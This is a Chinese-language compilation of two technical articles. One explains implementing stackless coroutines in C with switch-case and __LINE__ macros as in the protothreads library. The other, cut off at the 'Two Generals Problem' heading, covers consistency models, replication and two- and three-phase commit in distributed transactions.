当今一些具备协程语义的语言，比较重量级的如C#、erlang、golang，以及轻量级的python、lua、javascript、ruby，还有函数式的scala、scheme等。相比之下，作为原生态语言的 C 反而处于尴尬的地位，原因在于 C 依赖于一种叫做**栈帧**的例程调用，例程内部的状态量和返回值都保留在堆栈上，这意味着生产者和消费者相互之间无法实现平级调用，当然你可以改写成把生产者作为主例程然后将产品作为传递参数调用消费者例程，这样的代码写起来费力不讨好而且看起来会很难受，特别当协程数目达到十万数量级，这种写法就过于僵化了。

这就引出了协程的概念，**如果将每个协程的上下文（比如程序计数器）保存在其它地方而不是堆栈上，协程之间相互调用时，被调用的协程只要从堆栈以外的地方恢复上次出让点之前的上下文即可，这有点类似于 CPU 的上下文切换，**遗憾的是似乎只有更底层的汇编语言才能做到这一点。

难道 C 语言只能用多线程吗？幸运的是，C 标准库给我们提供了两种协程调度原语：一种是[ setjmp/longjmp](https://zh.wikipedia.org/wiki/Setjmp.h)，另一种是[ ucontext 组件](http://pubs.opengroup.org/onlinepubs/7990989799/xsh/ucontext.h.html)，它们内部（当然是用汇编语言）实现了协程的上下文切换，相较之下前者在应用上会产生相当的不确定性（比如不好封装，具体说明参考联机文档），所以后者应用更广泛一些，网上绝大多数 C 协程库也是基于 ucontext 组件实现的。

#### “蝇量级”的协程库

在此，我来介绍一种“蝇量级”的开源 C 协程库 [protothreads](http://dunkels.com/adam/pt/)。这是一个全部用 ANSI C 写成的库，之所以称为“蝇量级”的，就是说，实现已经不能再精简了，几乎就是原语级别。事实上 protothreads 整个库不需要链接加载，因为所有源码都是头文件，类似于 STL 这样不依赖任何第三方库，在任何平台上可移植；总共也就 5 个头文件，有效代码量不足 100 行；API 都是宏定义的，所以不存在调用开销；最后，每个协程的空间开销是 2 个字节（是的，你没有看错，就是一个 short 单位的“栈”！）当然这种精简是要以使用上的局限为代价的，接下来的分析会说明这一点。

先来看看 protothreads 作者，[Adam Dunkels](http://dunkels.com/adam/)，一位来自瑞典皇家理工学院的计算机天才帅哥。话说这哥们挺有意思的，写了好多轻量级的作品，都是 BSD 许可证。顺便说一句，轻量级开源软件全世界多如牛毛，可像这位哥们写得如此出名的并不多。比如嵌入式网络操作系统 [Contiki](http://www.contiki-os.org/)，国人耳熟能详的 TCP/IP 协议栈 [uIP](https://en.wikipedia.org/wiki/UIP_(micro_IP)) 和 [lwIP](http://savannah.nongnu.org/projects/lwip/) 也是出自其手。上述这些软件都是经过数十年企业级应用的考验，质量之高可想而知。

很多人会好奇如此“蝇量级”的代码究竟是怎么实现的呢？在分析 protothreads 源码之前，我先来给大家补一补 C 语言的基础课;-^)简而言之，这利用了 C 语言特性上的一个“奇技淫巧”，而且这种技巧恐怕连许多具备十年以上经验的 C 程序员老手都不见得知晓。当然这里先要声明我不是推荐大家都这么用，实际上这是以破坏语言的代码规范为代价，在一些严肃的项目工程中需要谨慎对待，除非你想被炒鱿鱼。

#### C 语言的“yield 语义”

下面的教程来自于一位 ARM 工程师、天才黑客 [Simon Tatham](http://www.chiark.greenend.org.uk/~sgtatham/)（开源 Telnet/SSH 客户端 [PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/) 和汇编器 [NASM](http://www.nasm.us/) 的作者，吐槽一句，PuTTY的源码号称是所有正式项目里最难 hack 的 C，你应该猜到作者是什么语言出身）的博文：[Coroutines in C](http://www.chiark.greenend.org.uk/~sgtatham/coroutines.html)。中文译文在[这里](http://www.oschina.net/translate/coroutines-in-c)。

我们知道 python 的 yield 语义功能类似于一种迭代生成器，函数会保留上次的调用状态，并在下次调用时会从上个返回点继续执行。用 C 语言来写就像这样：

**int** function(**void**) {

  **int** i;

  **for** (i = 0; i < 10; i++)

​    **return** i;   /* won't work, but wouldn't it be nice */

}

连续对它调用 10 次，它能分别返回 0 到 9。该怎样实现呢？可以利用 goto 语句，如果我们在函数中加入一个状态变量，就可以这样实现：

**int** function(**void**) {

  **static** **int** i, state = 0;

  **switch** (state) {

​    **case** 0: **goto** LABEL0;

​    **case** 1: **goto** LABEL1;

  }

  LABEL0: /* start of function */

  **for** (i = 0; i < 10; i++) {

​    state = 1; /* so we will come back to LABEL1 */

​    **return** i;

​    LABEL1:; /* resume control straight after the return */

  }

}

这个方法是可行的。我们在所有需要 yield 的位置都加上标签：起始位置加一个，还有所有 return 语句之后都加一个。每个标签用数字编号，我们在状态变量中保存这个编号，这样就能在我们下次调用时告诉我们应该跳到哪个标签上。每次返回前，更新状态变量，指向到正确的标签；不论调用多少次，针对状态变量的 switch 语句都能找到我们要跳转到的位置。

但这还是难看得很。最糟糕的部分是所有的标签都需要手工维护，还必须保证函数中的标签和开头 switch 语句中的一致。每次新增一个 return 语句，就必须想一个新的标签名并将其加到 switch 语句中；每次删除 return 语句时，同样也必须删除对应的标签。这使得维护代码的工作量增加了一倍。

仔细想想，其实我们可以不用 switch 语句来决定要跳转到哪里去执行，而是**直接利用 switch 语句本身来实现跳转**：

**int** function(**void**) {

  **static** **int** i, state = 0;

  **switch** (state) {

​    **case** 0: /* start of function */

​    **for** (i = 0; i < 10; i++) {

​      state = 1; /* so we will come back to "case 1" */

​      **return** i;

​      **case** 1:; /* resume control straight after the return */

​    }

  }

}

酷！没想到 switch-case 语句可以这样用，其实说白了 C 语言就是脱胎于汇编语言的，switch-case 跟 if-else 一样，无非就是汇编的条件跳转指令的另类实现而已（这也间接解释了为何汇编程序员经常揶揄 C 语言是“大便一样的代码”）。我们还可以用 __LINE__ 宏使其更加一般化：

**int** function(**void**) {

  **static** **int** i, state = 0;

  **switch** (state) {

​    **case** 0: /* start of function */

​    **for** (i = 0; i < 10; i++) {

​      state = __LINE__ + 2; /* so we will come back to "case __LINE__" */

​      **return** i;

​      **case** __LINE__:; /* resume control straight after the return */

​    }

  }

}

这样一来我们可以用宏提炼出一种范式，封装成组件：

**#define Begin() static int state=0; switch(state) { case 0:**

**#define Yield(x) do { state=__LINE__; return x; case __LINE__:; } while (0)**

**#define End() }**

**int** function(**void**) {

  **static** **int** i;

  Begin();

  **for** (i = 0; i < 10; i++)

​    Yield(i);

  End();

}

怎么样，看起来像不像发明了一种全新的语言？**实际上我们利用了 switch-case 的分支跳转特性，以及预编译的 __LINE__ 宏，实现了一种隐式状态机，最终实现了“yield 语义”。**

还有一个问题，当你欢天喜地地将这种鲜为人知的技巧运用到你的项目中，并成功地拿去向你的上司邀功问赏的时候，你的上司会怎样看待你的代码呢？你的宏定义中大括号没有匹配完整，在代码块中包含了未用到的 case，Begin 和 Yield 宏里面不完整的七拼八凑……你简直就是公司里不遵守编码规范的反面榜样！

别着急，在原文中 Simon Tatham 大牛帮你找到一个坚定的反驳理由，我觉得对程序员来说简直是金玉良言。

将编程规范用在这里是不对的。文章里给出的示例代码不是很长，也不很复杂，即便以状态机的方式改写还是能够看懂的。但是随着代码越来越长，改写的难度将越来越大，改写对直观性造成的损失也变得相当相当大。

想一想，一个函数如果包含这样的小代码块：

**case** STATE1:

/* perform some activity */

**if** (condition) state = STATE2; **else** state = STATE3;

对于看代码的人说，这和包含下面小代码块的函数没有多大区别：

LABEL1:

/* perform some activity */

**if** (condition) **goto** LABEL2; **else** **goto** LABEL3;

是的，这两个函数的结构在视觉上是一样的，而对于函数中实现的算法，两个函数都一样不利于查看。因为你使用协程的宏而炒你鱿鱼的人，一样会因为你写的函数是由小块的代码和 goto 语句组成而吼着炒了你。只是这次他们没有冤枉你，因为像那样设计的函数会严重扰乱算法的结构。

**编程规范的目标就是为了代码清晰。**如果将一些重要的东西，像 switch、return 以及 case 语句，隐藏到起“障眼”作用的宏中，从编程规范的角度讲，可以说你扰乱了程序的语法结构，并且违背了代码清晰这一要求。但是我们这样做是为了突出程序的算法结构，而算法结构恰恰是看代码的人更想了解的。

**任何编程规范，坚持牺牲算法清晰度来换取语法清晰度的，都应该重写。**如果你的上司因为使用了这一技巧而解雇你，那么在保安把你往外拖的时候要不断告诉他这一点。

原文作者最后给出了一个 MIT 许可证的 [coroutine.h](http://www.chiark.greenend.org.uk/~sgtatham/coroutine.h) 头文件。值得一提的是，正如文中所说，这种协程实现方法有个使用上的局限，就是**协程调度状态的保存依赖于 static 变量，而不是堆栈上的局部变量**，实际上也无法用局部变量（堆栈）来保存状态，这就使得代码不具备可重入性和多线程应用。后来作者补充了一种技巧，就是将局部变量包装成函数参数传入的一个虚构的上下文结构体指针，然后用动态分配的堆来“模拟”堆栈，解决了线程可重入问题。但这样一来反而有损代码清晰，比如所有局部变量都要写成对象成员的引用方式，特别是局部变量很多的时候很麻烦，再比如宏定义 malloc/free 的玩法过于托大，不易控制，搞不好还增加了被炒鱿鱼的风险（只不过这次是你活该）。

我个人认为，既然协程本身是一种单线程的方案，那么我们应该假定应用环境是单线程的，不存在代码重入问题，所以我们可以大胆地使用 static 变量，维持代码的简洁和可读性。事实上**我们也不应该在多线程环境下考虑使用这么简陋的协程**，非要用的话，前面提到 glibc 的 ucontext 组件也是一种可行的替代方案，它提供了一种协程私有堆栈的上下文，当然这种用法在跨线程上也并非没有限制，请仔细阅读联机文档。

#### Protothreads的上下文

感谢 Simon Tatham 的淳淳教诲，接下来我们可以 hack 一下源码了。先来看看实现 protothreads 的数据结构， 实际上它就是协程的**上下文结构体**，用以保存状态变量，相信你很快就明白为何它的“堆栈”只有 2 个字节：

**struct** pt {

  lc_t lc;

}

里面只有一个 short 类型的变量，实际上它是用来保存上一次出让点的程序计数器。这也映证了协程比线程的灵活之处，就是协程可以是 stackless 的，如果需要实现的功能很单一，比如像生产者-消费者模型那样用来做事件通知，那么实际上协程需要保存的状态变量仅仅是一个程序计数器即可。像 python generator 也是 stackless 的，当然实现一个迭代生成器可能还需要保留上一个迭代值，前面 C 的例子是用 static 变量保存，你也可以设置成员变量添加到上下文结构体里面。如果你真的不确定用协程调度时需要保存多少状态变量，那还是用 ucontext 好了，它的上下文提供了堆栈和信号，但是由用户负责分配资源，详细使用方法见联机文档。。

**typedef** **struct** ucontext {

  **struct** ucontext_t *uc_link;

  sigset_t uc_sigmask;

  stack_t uc_stack;

  ...

} ucontext_t;

#### Protothreads的原语和组件

有点扯远了，回到 protothreads，看看提供的协程“原语”。有两种实现方法，在 ANSI C 下，就是传统的 switch-case 语句：

**#define LC_INIT（s） s = 0;  // 源码中是有分号的，一个低级 bug，啊哈～**

**#define LC_RESUME(s) switch (s) { case 0:**

**#define LC_SET(s) s = __LINE__; case __LINE__:**

**#define LC_END(s) }**

但这种“原语”有个难以察觉的缺陷：**就是你无法在 LC_RESUME 和 LC_END （或者包含它们的组件）之间的代码中使用 switch-case语句，因为这会引起外围的 switch 跳转错误！**为此，protothreads 又实现了基于 GNU C 的调度“原语”。在 GNU C 下还有一种语法糖叫做标签指针，就是在一个 label 前面加 &&（不是地址的地址，是 GNU 自定义的符号），可以用 void 指针类型保存，然后 goto 跳转：

**typedef** **void** * lc_t；

**#define LC_INIT(s) s = NULL**

**#define LC_RESUME(s) \**

  **do** { \

​    **if** (s != **NULL**) { \

​      **goto** *s; \

​    }

  } **while** (0)

**#define LC_CONCAT2(s1, s2) s1##s2**

**#define LC_CONCAT(s1, s2) LC_CONCAT2(s1, s2)**

**#define LC_SET(s) \**

  **do** { \

​    LC_CONCAT(LC_LABEL, __LINE__): \

​    （s） = &&LC_CONCAT(LC_LABEL, __LINE__); \

  } **while** (0)

好了，有了前面的基础知识，理解这些“原语”就是小菜一叠，下面看看如何建立“组件”，同时也是 protothreads API，我们先定义四个退出码作为协程的**调度状态机**：

**#define PT_WAITING 0**

**#define PT_YIELDED 1**

**#define PT_EXITED  2**

**#define PT_ENDED   3**

下面这些 API 可直接在应用程序中调用：

/* 初始化一个协程，也即初始化状态变量 */

**#define PT_INIT(pt) LC_INIT((pt)->lc)**

/* 声明一个函数，返回值为 char 即退出码，表示函数体内使用了 proto thread，（个人觉得有些多此一举） */

**#define PT_THREAD(name_args) char name_args**

/* 协程入口点， PT_YIELD_FLAG=0表示出让，=1表示不出让，放在 switch 语句前面，下次调用的时候可以跳转到上次出让点继续执行 */

**#define PT_BEGIN(pt) { char PT_YIELD_FLAG = 1; LC_RESUME((pt)->lc)**

/* 协程退出点，至此一个协程算是终止了，清空所有上下文和标志 */

**#define PT_END(pt) LC_END((pt)->lc); PT_YIELD_FLAG = 0; \**

​                   PT_INIT(pt); **return** PT_ENDED; }

/* 协程出让点，如果此时协程状态变量 lc 已经变为 __LINE__ 跳转过来的，那么 PT_YIELD_FLAG = 1，表示从出让点继续执行。 */

**#define PT_YIELD(pt)        \**

  **do** {            \

​    PT_YIELD_FLAG = 0;        \

​    LC_SET((pt)->lc);       \

​    **if**(PT_YIELD_FLAG == 0) {      \

​      **return** PT_YIELDED;      \

​    }           \

  } **while**(0)

/* 附加出让条件 */

**#define PT_YIELD_UNTIL(pt, cond)    \**

  **do** {            \

​    PT_YIELD_FLAG = 0;        \

​    LC_SET((pt)->lc);       \

​    **if**((PT_YIELD_FLAG == 0) || !(cond)) { \

​      **return** PT_YIELDED;      \

​    }           \

  } **while**(0)

/* 协程阻塞点(blocking),本质上等同于 PT_YIELD_UNTIL，只不过退出码是 PT_WAITING，用来模拟信号量同步 */

**#define PT_WAIT_UNTIL(pt, condition)          \**

  **do** {            \

​    LC_SET((pt)->lc);       \

​    **if**(!(condition)) {        \

​      **return** PT_WAITING;      \

​    }           \

  } **while**(0)

/* 同 PT_WAIT_UNTIL 条件反转 */

**#define PT_WAIT_WHILE(pt, cond)  PT_WAIT_UNTIL((pt), !(cond))**

/* 协程调度，调用协程 f 并检查它的退出码，直到协程终止返回 0，否则返回 1。 */

**#define PT_SCHEDULE(f) ((f) < PT_EXITED)**

/* 这用于非对称协程，调用者是主协程，pt 是和子协程 thread （可以是多个）关联的上下文句柄，主协程阻塞自己调度子协程，直到所有子协程终止 */

**#define PT_WAIT_THREAD(pt, thread) PT_WAIT_WHILE((pt), PT_SCHEDULE(thread))**

/* 用于协程嵌套调度，child 是子协程的上下文句柄 */

**#define PT_SPAWN(pt, child, thread)   \**

  **do** {            \

​    PT_INIT((child));       \

​    PT_WAIT_THREAD((pt), (thread));   \

  } **while**(0)

暂时介绍这么多，用户还可以根据自己的需求随意扩展组件，比如实现信号量，你会发现脱离了操作系统环境下的信号量竟是如此简单：

**struct** pt_sem {

  unsigned **int** count;

};

**#define PT_SEM_INIT(s, c) (s)->count = c**

**#define PT_SEM_WAIT(pt, s)  \**

  **do** {            \

​    PT_WAIT_UNTIL(pt, (s)->count > 0);    \

​    --(s)->count;       \

  } **while**(0)

**#define PT_SEM_SIGNAL(pt, s) ++(s)->count**

这些应该不需要我多说了吧，呵呵，让我们回到最初例举的生产者-消费者模型，看看protothreads表现怎样。

#### Protothreads实战

**#include "pt-sem.h"**

**#define NUM_ITEMS 32**

**#define BUFSIZE 8**

**static** **struct** pt_sem mutex, full, empty;

PT_THREAD(producer(**struct** pt *pt))

{

  **static** **int** produced;

  PT_BEGIN(pt);

  **for** (produced = 0; produced < NUM_ITEMS; ++produced) {

​    PT_SEM_WAIT(pt, &full);

​    PT_SEM_WAIT(pt, &mutex);

​    add_to_buffer(produce_item());

​    PT_SEM_SIGNAL(pt, &mutex);

​    PT_SEM_SIGNAL(pt, &empty);

  }

  PT_END(pt);

}

PT_THREAD(consumer(**struct** pt *pt))

{

  **static** **int** consumed;

  PT_BEGIN(pt);

  **for** (consumed = 0; consumed < NUM_ITEMS; ++consumed) {

​    PT_SEM_WAIT(pt, &empty);

​    PT_SEM_WAIT(pt, &mutex);

​    consume_item(get_from_buffer());

​    PT_SEM_SIGNAL(pt, &mutex);

​    PT_SEM_SIGNAL(pt, &full);

  }

  PT_END(pt);

}

PT_THREAD(driver_thread(**struct** pt *pt))

{

  **static** **struct** pt pt_producer, pt_consumer;

  PT_BEGIN(pt);

  PT_SEM_INIT(&empty, 0);

  PT_SEM_INIT(&full, BUFSIZE);

  PT_SEM_INIT(&mutex, 1);

  PT_INIT(&pt_producer);

  PT_INIT(&pt_consumer);

  PT_WAIT_THREAD(pt, producer(&pt_producer) & consumer(&pt_consumer));

  PT_END(pt);

}

源码包中的 example-buffer.c 包含了可运行的完整示例，我就不全部贴了。整体框架就是一个 asymmetric coroutines，包括一个主协程 driver_thread 和两个子协程 producer 和 consumer ，其实不用多说大家也懂的，代码非常清晰直观。我们完全可以通过单线程实现一个简单的事件处理需求，你可以任意添加数十万个协程，几乎不会引起任何额外的系统开销和资源占用。唯一需要留意的地方就是没有一个局部变量，因为 protothreads 是 stackless 的，但这不是问题，首先我们已经假定运行环境是单线程的，其次在一个简化的需求下也用不了多少“局部变量”。如果在协程出让时需要保存一些额外的状态量，像迭代生成器，只要数目和大小都是确定并且可控的话，自行扩展协程上下文结构体即可。

当然这不是说 protothreads 是万能的，它只是贡献了一种模型，你要使用它首先就得学会适应它。下面列举一些 protothreads 的使用限制：

- 由于协程是stackless的，尽量不要使用局部变量，除非该变量对于协程状态是无关紧要的，同理可推，协程所在的代码是不可重入的。

- 如果协程使用 switch-case 原语封装的组件，那么禁止在实际应用中使用 switch-case 语句，除非用 GNU C 语法中的标签指针替代。

- 一个协程内部可以调用其它例程，比如库函数或系统调用，但必须保证该例程是非阻塞的，否则所在线程内的所有协程都将被阻塞。毕竟线程才是执行的最小单位，协程不过是按“时间片轮度”的例程而已。

官网上还例举了更多[实例](http://dunkels.com/adam/pt/examples.html)，都非常实用。另外，一个叫 Craig Graham 的工程师扩展了 pt.h，使得 protothreads 支持 sleep/wake/kill 等操作，文件在此 [graham-pt.h](http://dunkels.com/adam/download/graham-pt.h)。

#### 协程库 DIY 攻略

看到这里，手养的你是否想迫不及待地 DIY 一个协程组件呢？哪怕很多动态语言本身已经支持了协程语义，很多 C 程序员仍然倾向于自己实现组件，网上很多开源代码底层用的主要还是 glibc 的 ucontext 组件，毕竟提供堆栈的协程组件使用起来更加通用方便。你可以自己写一个调度器，然后模拟线程上下文，再然后……你就能搞出一个跨平台的COS了（笑）。GNU Pth 线程库就是这么实现的，其原作者德国人 [Ralf S. Engelschall](http://engelschall.com/) （又是个开源大牛，还写了 [OpenSSL 等许多作品](http://engelschall.com/software-artist.php)）就写了一篇[论文](http://xmailserver.org/rse-pmt.pdf)教大家如何实现一个线程库。另外 protothreads 官网上也有一大堆[推荐阅读](http://dunkels.com/adam/pt/links.html)。Have fun！

（全文完）

# 分布式系统的事务处理

#####  [2014年01月20日 ](https://coolshell.cn/articles/10910.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [181 条评论](https://coolshell.cn/articles/10910.html#comments) 284,519 人阅读

![img](photo/trade-off.jpg)当我们在生产线上用一台服务器来提供数据服务的时候，我会遇到如下的两个问题：

1）一台服务器的性能不足以提供足够的能力服务于所有的网络请求。

2）我们总是害怕我们的这台服务器停机，造成服务不可用或是数据丢失。

于是我们不得不对我们的服务器进行扩展，加入更多的机器来分担性能上的问题，以及来解决单点故障问题。 通常，我们会通过两种手段来扩展我们的数据服务：

1）**数据分区**：就是把数据分块放在不同的服务器上（如：uid % 16，一致性哈希等）。

2）**数据镜像**：让所有的服务器都有相同的数据，提供相当的服务。

对于第一种情况，我们无法解决数据丢失的问题，单台服务器出问题时，会有部分数据丢失。所以，**数据服务的高可用性只能通过第二种方法来完成——数据的冗余存储**（一般工业界认为比较安全的备份数应该是3份，如：Hadoop和Dynamo）**。 但是，加入更多的机器，会让我们的数据服务变得很复杂，尤其是跨服务器的事务处理，也就是跨服务器的数据一致性**。这个是一个很难的问题。 让我们用最经典的Use Case：“A帐号向B帐号汇钱”来说明一下，熟悉RDBMS事务的都知道从帐号A到帐号B需要6个操作：

1. 从A帐号中把余额读出来。
2. 对A帐号做减法操作。
3. 把结果写回A帐号中。
4. 从B帐号中把余额读出来。
5. 对B帐号做加法操作。
6. 把结果写回B帐号中。

为了数据的一致性，这6件事，要么都成功做完，要么都不成功，而且这个操作的过程中，对A、B帐号的其它访问必需锁死，所谓锁死就是要排除其它的读写操作，不然会有脏数据的问题，这就是事务。那么，我们在加入了更多的机器后，这个事情会变得复杂起来：



1）**在数据分区的方案中**：如果A帐号和B帐号的数据不在同一台服务器上怎么办？我们需要一个跨机器的事务处理。也就是说，如果A的扣钱成功了，但B的加钱不成功，我们还要把A的操作给回滚回去。这在跨机器的情况下，就变得比较复杂了。

2）**在数据镜像的方案中**：A帐号和B帐号间的汇款是可以在一台机器上完成的，但是别忘了我们有多台机器存在A帐号和B帐号的副本。如果对A帐号的汇钱有两个并发操作（要汇给B和C），这两个操作发生在不同的两台服务器上怎么办？也就是说，在数据镜像中，在不同的服务器上对同一个数据的写操作怎么保证其一致性，保证数据不冲突？

同时，我们还要考虑性能的因素，如果不考虑性能的话，事务得到保证并不困难，系统慢一点就行了。除了考虑性能外，我们还要考虑可用性，也就是说，一台机器没了，数据不丢失，服务可由别的机器继续提供。 于是，我们需要重点考虑下面的这么几个情况：

1）**容灾**：数据不丢、结点的Failover

2）**数据的一致性**：事务处理

3）**性能：吞吐量 、 响应时间**

前面说过，要解决数据不丢，只能通过数据冗余的方法，就算是数据分区，每个区也需要进行数据冗余处理。这就是数据副本：当出现某个节点的数据丢失时可以从副本读到，数据副本是分布式系统解决数据丢失异常的唯一手段。所以，在这篇文章中，简单起见，我们只讨论在数据冗余情况下考虑数据的一致性和性能的问题。简单说来：

**1）要想让数据有高可用性，就得写多份数据。**

**2）写多份的问题会导致数据一致性的问题。**

**3）数据一致性的问题又会引发性能问题**

这就是软件开发，按下了葫芦起了瓢。

目录



[一致性模型](https://coolshell.cn/articles/10910.html#一致性模型)[Master-Slave](https://coolshell.cn/articles/10910.html#Master-Slave)[Master-Master](https://coolshell.cn/articles/10910.html#Master-Master)[Two/Three Phase Commit](https://coolshell.cn/articles/10910.html#TwoThree_Phase_Commit)[Two Generals Problem（两将军问题）](https://coolshell.cn/articles/10910.html#Two_Generals_Problem（两将军问题）)[Paxos算法](https://coolshell.cn/articles/10910.html#Paxos算法)[总结](https://coolshell.cn/articles/10910.html#总结)[NWR模型](https://coolshell.cn/articles/10910.html#NWR模型)

#### 一致性模型

说起数据一致性来说，简单说有三种类型（当然，如果细分的话，还有很多一致性模型，如：顺序一致性，FIFO一致性，会话一致性，单读一致性，单写一致性，但为了本文的简单易读，我只说下面三种）：

1）**Weak 弱一致性**：当你写入一个新值后，读操作在数据副本上可能读出来，也可能读不出来。比如：某些cache系统，网络游戏其它玩家的数据和你没什么关系，VOIP这样的系统，或是百度搜索引擎（呵呵）。

2）**Eventually 最终一致性**：当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如：DNS，电子邮件、Amazon S3，Google搜索引擎这样的系统。

3）**Strong 强一致性**：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统，RDBMS，Azure Table都是强一致性的。

从这三种一致型的模型上来说，我们可以看到，Weak和Eventually一般来说是异步冗余的，而Strong一般来说是同步冗余的，异步的通常意味着更好的性能，但也意味着更复杂的状态控制。同步意味着简单，但也意味着性能下降。 好，让我们由浅入深，一步一步地来看有哪些技术：

#### Master-Slave

首先是Master-Slave结构，对于这种加构，Slave一般是Master的备份。在这样的系统中，一般是如下设计的：

1）读写请求都由Master负责。

2）写请求写到Master上后，由Master同步到Slave上。

从Master同步到Slave上，你可以使用异步，也可以使用同步，可以使用Master来push，也可以使用Slave来pull。 通常来说是Slave来周期性的pull，所以，是最终一致性。这个设计的问题是，如果Master在pull周期内垮掉了，那么会导致这个时间片内的数据丢失。如果你不想让数据丢掉，Slave只能成为Read-Only的方式等Master恢复。

当然，如果你可以容忍数据丢掉的话，你可以马上让Slave代替Master工作（对于只负责计算的结点来说，没有数据一致性和数据丢失的问题，Master-Slave的方式就可以解决单点问题了） 当然，Master Slave也可以是强一致性的， 比如：当我们写Master的时候，Master负责先写自己，等成功后，再写Slave，两者都成功后返回成功，整个过程是同步的，如果写Slave失败了，那么两种方法，一种是标记Slave不可用报错并继续服务（等Slave恢复后同步Master的数据，可以有多个Slave，这样少一个，还有备份，就像前面说的写三份那样），另一种是回滚自己并返回写失败。（注：一般不先写Slave，因为如果写Master自己失败后，还要回滚Slave，此时如果回滚Slave失败，就得手工订正数据了）你可以看到，如果Master-Slave需要做成强一致性有多复杂。

#### Master-Master

Master-Master，又叫[Multi-master](https://en.wikipedia.org/wiki/Multi-master_replication)，是指一个系统存在两个或多个Master，每个Master都提供read-write服务。这个模型是Master-Slave的加强版，数据间同步一般是通过Master间的异步完成，所以是最终一致性。 Master-Master的好处是，一台Master挂了，别的Master可以正常做读写服务，他和Master-Slave一样，当数据没有被复制到别的Master上时，数据会丢失。很多数据库都支持Master-Master的Replication的机制。

另外，如果多个Master对同一个数据进行修改的时候，这个模型的恶梦就出现了——对数据间的冲突合并，这并不是一件容易的事情。看看Dynamo的Vector Clock的设计（记录数据的版本号和修改者）就知道这个事并不那么简单，而且Dynamo对数据冲突这个事是交给用户自己搞的。就像我们的SVN源码冲突一样，对于同一行代码的冲突，只能交给开发者自己来处理。（在本文后后面会讨论一下Dynamo的Vector Clock）

#### Two/Three Phase Commit

这个协议的缩写又叫2PC，中文叫两阶段提交。在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为**协调者**的组件来统一掌控所有节点(称作**参与者**)的操作结果并最终指示这些节点是否要把操作结果进行真正的提交(比如将更新后的数据写入磁盘等等)。 两阶段提交的算法如下：

**第一阶段**：

1. 协调者会问所有的参与者结点，是否可以执行提交操作。
2. 各个参与者开始事务执行的准备工作：如：为资源上锁，预留资源，写undo/redo log……
3. 参与者响应协调者，如果事务的准备工作成功，则回应“可以提交”，否则回应“拒绝提交”。

**第二阶段**：

- 如果所有的参与者都回应“可以提交”，那么，协调者向所有的参与者发送“正式提交”的命令。参与者完成正式提交，并释放所有资源，然后回应“完成”，协调者收集各结点的“完成”回应后结束这个Global Transaction。

- 如果有一个参与者回应“拒绝提交”，那么，协调者向所有的参与者发送“回滚操作”，并释放所有资源，然后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个Global Transaction。

![img](photo/Two-phase_commit.png)

我们可以看到，2PC说白了就是第一阶段做Vote，第二阶段做决定的一个算法，也可以看到2PC这个事是强一致性的算法。在前面我们讨论过Master-Slave的强一致性策略，和2PC有点相似，只不过2PC更为保守一些——先尝试再提交。 2PC用的是比较多的，在一些系统设计中，会串联一系列的调用，比如：A -> B -> C -> D，每一步都会分配一些资源或改写一些数据。比如我们B2C网上购物的下单操作在后台会有一系列的流程需要做。如果我们一步一步地做，就会出现这样的问题，如果某一步做不下去了，那么前面每一次所分配的资源需要做反向操作把他们都回收掉，所以，操作起来比较复杂。现在很多处理流程（Workflow）都会借鉴2PC这个算法，使用 try -> confirm的流程来确保整个流程的能够成功完成。 举个通俗的例子，西方教堂结婚的时候，都有这样的桥段：

1）牧师分别问新郎和新娘：你是否愿意……不管生老病死……（询问阶段）

2）当新郎和新娘都回答愿意后（锁定一生的资源），牧师就会说：我宣布你们……（事务提交）

这是多么经典的一个两阶段提交的事务处理。 另外，我们也可以看到其中的一些问题， A）其中一个是同步阻塞操作，这个事情必然会非常大地影响性能。 B）另一个主要的问题是在TimeOut上，比如，

1）如果第一阶段中，参与者没有收到询问请求，或是参与者的回应没有到达协调者。那么，需要协调者做超时处理，一旦超时，可以当作失败，也可以重试。

2）如果第二阶段中，正式提交发出后，如果有的参与者没有收到，或是参与者提交/回滚后的确认信息没有返回，一旦参与者的回应超时，要么重试，要么把那个参与者标记为问题结点剔除整个集群，这样可以保证服务结点都是数据一致性的。

3）糟糕的情况是，第二阶段中，如果参与者收不到协调者的commit/fallback指令，参与者将处于“状态未知”阶段，参与者完全不知道要怎么办，比如：如果所有的参与者完成第一阶段的回复后（可能全部yes，可能全部no，可能部分yes部分no），如果协调者在这个时候挂掉了。那么所有的结点完全不知道怎么办（问别的参与者都不行）。为了一致性，要么死等协调者，要么重发第一阶段的yes/no命令。

两段提交最大的问题就是第3）项，**如果第一阶段完成后，参与者在第二阶没有收到决策，那么数据结点会进入“不知所措”的状态，这个状态会block住整个事务**。也就是说，协调者Coordinator对于事务的完成非常重要，Coordinator的可用性是个关键。 因些，我们引入三段提交，三段提交在[Wikipedia](https://en.wikipedia.org/wiki/Three-phase_commit_protocol)上的描述如下，他把二段提交的第一个段break成了两段：询问，然后再锁资源。最后真正提交。三段提交的示意图如下：

![img](photo/Three-phase_commit_diagram.png)

三段提交的核心理念是：**在询问的时候并不锁定资源，除非所有人都同意了，才开始锁资源**。

理论上来说，如果第一阶段所有的结点返回成功，那么有理由相信成功提交的概率很大。这样一来，可以降低参与者Cohorts的状态未知的概率。也就是说，一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了。这一点很重要。下面我们来看一下3PC的状态迁移图：（**注意图中的虚线，那些F,T是Failuer或Timeout**，其中的：状态含义是 q – Query，a – Abort，w – Wait，p – PreCommit，c – Commit）

![img](photo/Three-phase_commit_status.png)

从上图的状态变化图我们可以从虚线（那些F,T是Failuer或Timeout）看到——**如果结点处在P状态（PreCommit）的时候发生了F/T的问题，三段提交比两段提交的好处是，三段提交可以继续直接把状态变成C状态（Commit），而两段提交则不知所措**。

其实，三段提交是一个很复杂的事情，实现起来相当难，而且也有一些问题。

看到这里，我相信你有很多很多的问题，你一定在思考2PC/3PC中各种各样的失败场景，**你会发现Timeout是个非常难处理的事情，因为网络上的Timeout在很多时候让你无所事从，你也不知道对方是做了还是没有做。于是你好好的一个状态机就因为Timeout成了个摆设**。

**一个网络服务会有三种状态：1）Success，2）Failure，3）Timeout，第三个绝对是恶梦，尤其在你需要维护状态的时候**。

#### Two Generals Problem（两将军问题）

